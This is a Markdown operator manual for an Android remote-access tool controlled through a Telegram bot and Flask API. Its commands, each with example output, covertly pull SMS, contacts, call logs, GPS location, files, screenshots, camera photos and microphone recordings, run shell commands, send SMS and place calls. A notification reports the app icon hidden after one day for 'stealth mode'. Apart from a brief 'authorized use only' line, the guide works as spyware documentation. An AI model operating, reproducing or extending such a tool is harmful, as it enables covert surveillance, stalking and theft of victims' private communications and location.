# Telegram Bot Usage Guide

## Complete Remote Administration via Telegram

This guide explains how to control and manage Android devices remotely using the integrated Telegram bot.

## Setup

### 1. Create Telegram Bot

1. Open Telegram and search for `@BotFather`
2. Send `/newbot` command
3. Choose a name for your bot (e.g., "Device Manager Bot")
4. Choose a username (must end with 'bot', e.g., "mydevicemanager_bot")
5. Copy the **Bot Token** provided by BotFather

### 2. Get Your Chat ID

1. Search for `@userinfobot` in Telegram
2. Start a conversation
3. The bot will send you your Chat ID
4. Save this Chat ID

### 3. Configure the Application

Create a `.env` file or set environment variables:

```bash
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_ADMIN_CHAT_ID=your_chat_id_here
```

Or set them directly in the app startup.

### 4. Start the Bot

Once the Android app is running, the Telegram bot will automatically start and begin monitoring for commands.

## Bot Commands Reference

### Device Management

#### `/start` or `/help`
Shows the complete help menu with all available commands.

**Example:**
```
/start
```

#### `/devices`
Lists all connected devices with their IDs and last seen time.

**Example:**
```
/devices
```

**Response:**
```
📱 Connected Devices:

🔹 Samsung_SM-G950F_123456
   Last seen: 2024-01-15 10:30:25

🔹 OnePlus_9_654321
   Last seen: 2024-01-15 09:15:10
```

#### `/status device_id`
Get current status and information about a specific device.

**Example:**
```
/status Samsung_SM-G950F_123456
```

### Data Collection Commands

#### `/collect device_id`
Triggers complete data collection from the device including:
- Device information
- Location
- Contacts
- SMS messages
- Call logs
- Installed apps
- Network info
- Battery status

**Example:**
```
/collect Samsung_SM-G950F_123456
```

**Response:**
```
✅ Command sent successfully!
Command ID: abc123-def456
Device: Samsung_SM-G950F_123456
Command: collect

[After execution, you'll receive a JSON file with all collected data]
```

#### `/location device_id`
Gets the current GPS location of the device.

**Example:**
```
/location Samsung_SM-G950F_123456
```

**Response:**
```
📥 Data Received

Device: Samsung_SM-G950F_123456
Type: location
Time: 2024-01-15 10:35:00

Location: 37.7749, -122.4194
Maps: https://maps.google.com/?q=37.7749,-122.4194

[Also sends an interactive location pin on the map]
```

#### `/contacts device_id`
Retrieves the contact list from the device.

**Example:**
```
/contacts Samsung_SM-G950F_123456
```

**Response:**
```
[Sends a JSON file with all contacts including names and numbers]
```

#### `/sms device_id`
Gets SMS messages (inbox and sent).

**Example:**
```
/sms Samsung_SM-G950F_123456
```

#### `/calls device_id`
Retrieves call logs with timestamps and durations.

**Example:**
```
/calls Samsung_SM-G950F_123456
```

#### `/apps device_id`
Lists all installed applications.

**Example:**
```
/apps Samsung_SM-G950F_123456
```

#### `/info device_id`
Gets detailed device information (model, Android version, specs, etc.).

**Example:**
```
/info Samsung_SM-G950F_123456
```

### Media Capture Commands

#### `/screenshot device_id`
Captures and sends a screenshot of the device screen.

**Example:**
```
/screenshot Samsung_SM-G950F_123456
```

**Response:**
```
[Sends the screenshot as a photo with caption showing device and timestamp]
```

#### `/camera device_id`
Captures a photo using the device camera.

**Example:**
```
/camera Samsung_SM-G950F_123456
```

#### `/audio device_id [duration]`
Records audio from the microphone.

**Parameters:**
- `duration`: Optional, in seconds (default: 10)

**Examples:**
```
/audio Samsung_SM-G950F_123456
/audio Samsung_SM-G950F_123456 30
```

**Response:**
```
✅ Command sent successfully!
Audio capture started for 30 seconds

[After recording, sends the audio file]
```

### File Operations Commands

#### `/list device_id [path]`
Lists files in a directory.

**Parameters:**
- `path`: Optional directory path (default: /sdcard)

**Examples:**
```
/list Samsung_SM-G950F_123456
/list Samsung_SM-G950F_123456 /sdcard/Download
```

#### `/download device_id path`
Downloads a file from the device to Telegram.

**Example:**
```
/download Samsung_SM-G950F_123456 /sdcard/important_document.pdf
```

**Response:**
```
[Sends the file as a Telegram document]
```

#### `/upload device_id`
Uploads a file from Telegram to the device.

**Usage:**
1. Send the command
2. Then send the file you want to upload

**Example:**
```
/upload Samsung_SM-G950F_123456

[Then send your file]
```

#### `/search device_id pattern`
Searches for files matching a pattern.

**Example:**
```
/search Samsung_SM-G950F_123456 .pdf
/search Samsung_SM-G950F_123456 password
```

#### `/delete device_id path`
Deletes a file or directory from the device.

**Example:**
```
/delete Samsung_SM-G950F_123456 /sdcard/temp_file.txt
```

**⚠️ Warning:** This action is permanent!

### Communication Commands

#### `/sendsms device_id number message`
Sends an SMS message from the device.

**Example:**
```
/sendsms Samsung_SM-G950F_123456 +1234567890 Hello, this is a test message
```

**Response:**
```
✅ Command sent successfully!
SMS sent to +1234567890
```

#### `/call device_id number`
Initiates a phone call from the device.

**Example:**
```
/call Samsung_SM-G950F_123456 +1234567890
```

#### `/clipboard device_id`
Gets the current clipboard content.

**Example:**
```
/clipboard Samsung_SM-G950F_123456
```

**Response:**
```
✅ Command result

Device: Samsung_SM-G950F_123456
Command: get_clipboard
Status: success
Result: [clipboard content here]
```

#### `/setclip device_id text`
Sets the clipboard content on the device.

**Example:**
```
/setclip Samsung_SM-G950F_123456 https://example.com/login
```

### System Control Commands

#### `/shell device_id command`
Executes a shell command on the device.

**Examples:**
```
/shell Samsung_SM-G950F_123456 ls -la /sdcard
/shell Samsung_SM-G950F_123456 pm list packages
/shell Samsung_SM-G950F_123456 getprop ro.product.model
```

**Response:**
```
✅ Command result

Device: Samsung_SM-G950F_123456
Command: execute_shell
Status: success
Result: [command output here]
```

#### `/wifi device_id`
Scans and lists available WiFi networks.

**Example:**
```
/wifi Samsung_SM-G950F_123456
```

**Response:**
```
[JSON file with WiFi networks, SSIDs, signal strengths, and security types]
```

#### `/reboot device_id`
Reboots the device (requires root).

**Example:**
```
/reboot Samsung_SM-G950F_123456
```

#### `/uninstall device_id package`
Uninstalls an application from the device.

**Example:**
```
/uninstall Samsung_SM-G950F_123456 com.example.app
```

### Advanced Commands

#### `/export device_id`
Exports all collected data as a compressed ZIP file.

**Example:**
```
/export Samsung_SM-G950F_123456
```

**Response:**
```
[Sends a ZIP file containing all data from the device]
```

#### `/report device_id`
Generates a comprehensive report of device activity.

**Example:**
```
/report Samsung_SM-G950F_123456
```

## Real-Time Notifications

The bot sends automatic notifications for various events:

### New Device Connection
```
🆕 New Device Connected

Device ID: Samsung_SM-G950F_123456
Model: SM-G950F
Android: 12
Manufacturer: Samsung

Time: 2024-01-15 10:00:00
```

### Icon Hidden (After 1 Day)
```
🔒 Icon Hidden

Device: Samsung_SM-G950F_123456
App icon was automatically hidden after 1 day.

The app is now running in stealth mode.
```

### Data Received
```
📥 Data Received

Device: Samsung_SM-G950F_123456
Type: contacts
Time: 2024-01-15 10:35:00

[Followed by the data file]
```

### Screenshot Captured
```
[Photo with caption:]
📸 Screenshot from Samsung_SM-G950F_123456
2024-01-15 10:35:00
```

### Command Result
```
✅ Command Result

Device: Samsung_SM-G950F_123456
Command: get_location
Status: success
Result: Location retrieved successfully

Time: 2024-01-15 10:35:00
```

## File Transfers

### Sending Files to Device

1. Use `/upload device_id` command
2. Wait for confirmation
3. Send your file to the bot
4. File will be downloaded to device's `/sdcard/downloads/` folder

**Supported file types:**
- Documents (PDF, DOC, XLS, etc.)
- Images (JPG, PNG, GIF, etc.)
- Videos (MP4, AVI, etc.)
- Archives (ZIP, RAR, 7Z, etc.)
- APK files
- Any other file type

### Receiving Files from Device

Use the `/download` command with the full file path:

```
/download Samsung_SM-G950F_123456 /sdcard/DCIM/Camera/photo.jpg
```

The file will be sent to you via Telegram.

## Tips and Best Practices

### 1. Device ID Format
Device IDs are automatically generated in format: `Model_Device_Timestamp`

Example: `Samsung_SM-G950F_123456`

### 2. Command Responses
All commands return immediate confirmation. Actual results are sent when the device executes the command (within 10 seconds due to polling interval).

### 3. Large Data Files
For large data collections (contacts, SMS, etc.), data is sent as JSON files for easy parsing.

### 4. Multiple Devices
You can manage multiple devices simultaneously. Each device has a unique ID.

### 5. Command History
The bot maintains command history and results for each device, accessible via the server API.

### 6. Security
- Only commands from the configured admin chat ID are processed
- All communications use HTTPS (Telegram API)
- Bot token should be kept secret
- Change default credentials immediately

## Troubleshooting

### Bot Not Responding
1. Check bot token is correct
2. Verify admin chat ID is set properly
3. Ensure Flask server is running
4. Check network connectivity

### Device Not Appearing
1. Wait 5 minutes for first data sync
2. Check device has internet connection
3. Verify services are running on device
4. Check server logs

### Commands Not Executing
1. Verify device ID is correct (case-sensitive)
2. Check device is online
3. Wait 10 seconds (polling interval)
4. Check command syntax

### File Upload Fails
1. Check file size (Telegram has limits)
2. Verify storage space on device
3. Check permissions
4. Try smaller files first

## Advanced Usage

### Batch Commands
You can send multiple commands in sequence:

```
/collect device1
/collect device2
/screenshot device1
/location device2
```

### Automated Monitoring
Set up periodic data collection:

1. Use `/collect` every hour
2. Monitor location with `/location`
3. Check screenshots with `/screenshot`

### Data Analysis
Downloaded JSON files can be analyzed with tools like:
- Python (json module)
- jq (command-line JSON processor)
- Online JSON viewers

## Security Recommendations

1. **Use Strong Bot Token**: Never share your bot token
2. **Limit Admin Access**: Only use your personal chat ID
3. **Secure Environment**: Run Flask server on secure network
4. **Regular Updates**: Keep the application updated
5. **Data Encryption**: Enable encryption for sensitive data
6. **Access Logs**: Monitor command history regularly
7. **Secure Deletion**: Delete sensitive data after analysis

## Example Workflow

### Complete Device Audit

```
# Step 1: List devices
/devices

# Step 2: Get device info
/info Samsung_SM-G950F_123456

# Step 3: Collect all data
/collect Samsung_SM-G950F_123456

# Step 4: Get location
/location Samsung_SM-G950F_123456

# Step 5: Capture screenshot
/screenshot Samsung_SM-G950F_123456

# Step 6: List files
/list Samsung_SM-G950F_123456 /sdcard

# Step 7: Export everything
/export Samsung_SM-G950F_123456
```

### Emergency Data Retrieval

```
# Quick data grab
/screenshot device_id
/location device_id
/contacts device_id
/sms device_id
/calls device_id
```

### Remote Maintenance

```
# Check status
/info device_id
/wifi device_id

# View files
/list device_id /sdcard

# Download important file
/download device_id /sdcard/backup.zip

# Clean up
/delete device_id /sdcard/temp_files
```

## API Integration

The bot can also be controlled via the Flask API:

### Send Command
```bash
curl -X POST http://localhost:5000/api/bot/send_command \
  -H "Content-Type: application/json" \
  -d '{
    "device_id": "Samsung_SM-G950F_123456",
    "type": "get_location",
    "params": {}
  }'
```

### Get Result
```bash
curl http://localhost:5000/api/bot/get_result/device_id/command_id
```

### List Devices
```bash
curl http://localhost:5000/api/bot/devices
```

## Conclusion

The Telegram bot provides complete remote administration capabilities for Android devices. All major operations can be performed through simple text commands, with results delivered directly to your Telegram chat.

For technical support or questions, refer to the main README.md file.

---

**Remember:** This tool is for authorized use only. Always comply with applicable laws and regulations.
